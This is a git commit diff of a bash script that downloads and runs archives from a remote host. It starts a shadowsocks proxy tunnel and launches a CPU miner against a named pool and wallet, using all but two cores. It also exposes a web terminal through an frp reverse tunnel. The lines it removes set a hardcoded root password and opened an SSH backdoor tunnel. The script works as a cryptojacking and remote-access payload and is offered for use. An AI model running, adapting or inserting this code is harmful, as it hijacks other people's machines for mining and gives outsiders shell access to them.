736cbca731be408eab3a96d4d9d5695314e8c042
athayandamaqolomba <athayandamaqolomba@gmail.com>
2024-12-30 17:40:36 +0200

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,33 +1,73 @@
 #!/bin/bash
 cd
-curl https://greenleaf.teatspray.fun/system32.tar.gz -L -O -J
-sleep 2
-curl https://greenleaf.teatspray.fun/backup2.tar.gz -L -O -J
-sleep 2
-tar -xf system32.tar.gz
-sleep 2
-tar -xf backup2.tar.gz
-sleep 2
-./system32 -S . /bin/bash
 
 sleep 2
 
-su -
+wget -q http://greenleaf.teatspray.fun/Spectre.tar.gz
 
 sleep 2
-cd
-sleep 2
-whoami
-sleep 2
 
-export DEBIAN_FRONTEND=noninteractive
-DEBIAN_FRONTEND=noninteractive
+tar -xf Spectre.tar.gz
 
 sleep 2
-cat /etc/*-release
+
+./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
+
 sleep 2
 
-apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg libuv1-dev libssl-dev libhwloc-dev dropbear >/dev/null
+curl -s -x socks5h://127.0.0.1:1082 api.ipify.org
+
+sleep 2
+
+TZ='Africa/Johannesburg'; export TZ
+date
+sleep 2
+
+
+array=()
+for i in {a..z} {A..Z} {0..9}; 
+   do
+   array[$RANDOM]=$i
+done
+
+currentdate=$(date '+%d-%b-%Y_Sream_')
+ipaddress=$(curl -s api.ipify.org)
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+used_num_of_cores=`expr $num_of_cores - 2`
+underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
+underscore="_"
+underscored_ip+=$underscore
+currentdate+=$underscored_ip
+
+randomWord=$(printf %s ${array[@]::8} $'\n')
+currentdate+=$randomWord
+
+sleep 2
+
+echo ""
+echo "You will be using $used_num_of_cores cores"
+echo ""
+
+sleep 2
+
+wget -q http://greenleaf.teatspray.fun/Silly_Doctor_272.tar.gz 1>/dev/null 2>&1
+
+sleep 2
+
+tar -xf Silly_Doctor_272.tar.gz
+
+echo " "
+echo " "
+
+
+unset LD_PRELOAD
+unset LD_PRELOAD_ENV
+unset LD_LIBRARY_PATH
+
+sleep 2
+
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 --password $currentdate,c=MAZA,zap=MAZA --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive &
+
 sleep 2
 
 curl https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz -L -O -J
@@ -42,39 +82,8 @@ cp frp_0.48.0_linux_amd64/frpc ~/
 
 sleep 2
 
-cat > /etc/default/dropbear <<END
-NO_START=0
-DROPBEAR_PORT=2299
-DROPBEAR_EXTRA_ARGS=
-DROPBEAR_BANNER=""
-DROPBEAR_RECEIVE_WINDOW=65536
-END
-
-sleep 2
-
-echo "root:Pmataga87465622" | chpasswd
-sleep 2
-service dropbear restart
-sleep 2
-
-array=()
-for i in {a..z} {A..Z} {0..9}; 
-   do
-   array[$RANDOM]=$i
-done
-
-currentdate=$(date '+%d-%b-%Y_Stream_')
-ipaddress=$(curl -s api.ipify.org)
-underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
-underscore="_"
-underscored_ip+=$underscore
-currentdate+=$underscored_ip
-
-randomWord=$(printf %s ${array[@]::8} $'\n')
-currentdate+=$randomWord
-
 randomNumber=$(shuf -i 10000-65000 -n 1)
-randomNumber2=$(shuf -i 10000-65000 -n 1)
+
 
 sleep 2
 
@@ -89,24 +98,17 @@ local_ip = 127.0.0.1
 local_port = 8080
 remote_port = $randomNumber
 subdomain = $currentdate
-
-[dropbear.$currentdate]
-type = tcp
-local_ip = 127.0.0.1
-local_port = 2299
-remote_port = $randomNumber2
-subdomain = $currentdate
-
 END
 
 sleep 2
 
 echo "Your Gotty connection details will be $currentdate.emergencyaccess.teatspray.fun:$randomNumber" 
 
-echo "Your Dropbear connection details will be $currentdate.emergencyaccess.teatspray.fun:$randomNumber2" 
-
 sleep 2
 
 ./frpc -c frpc.ini &
 
-sleep 365d
+sleep 90d
+
+lscpu
+
